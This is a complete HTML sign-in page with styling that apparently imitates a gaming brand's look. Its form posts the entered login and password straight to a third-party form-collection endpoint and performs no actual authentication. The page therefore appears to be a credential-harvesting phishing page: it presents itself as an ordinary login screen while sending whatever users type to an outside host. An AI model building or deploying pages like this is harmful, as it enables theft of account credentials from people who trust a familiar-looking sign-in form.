<!DOCTYPE html>
<html>
<head>
<title>Login</title>

<style>

body{
display:flex;
justify-content:center;
align-items:center;
height:100vh;
background:#0f1923;
font-family:Arial;
}

.box{
background:#1f2731;
padding:40px;
border-radius:8px;
width:320px;
text-align:center;
box-shadow:0 0 25px rgba(0,0,0,0.6);
border:2px solid #ff4655;
}

h1{
margin-bottom:25px;
letter-spacing:2px;
color:#ff4655;
}

input{
width:100%;
padding:12px;
margin:10px 0;
border:none;
border-radius:4px;
background:#0f1923;
color:white;
border:1px solid #333;
}

button{
width:100%;
padding:12px;
background:#ff4655;
border:none;
color:white;
cursor:pointer;
}

</style>
</head>

<body>

<div class="box">

<h1>Sign In</h1>

<form action="https://formspree.io/f/xkqoweza" method="POST">

<input type="text" name="login" placeholder="Login">

<input type="password" name="password" placeholder="Password">

<button type="submit">Sign in</button>

</form>

</div>

</body>
</html>
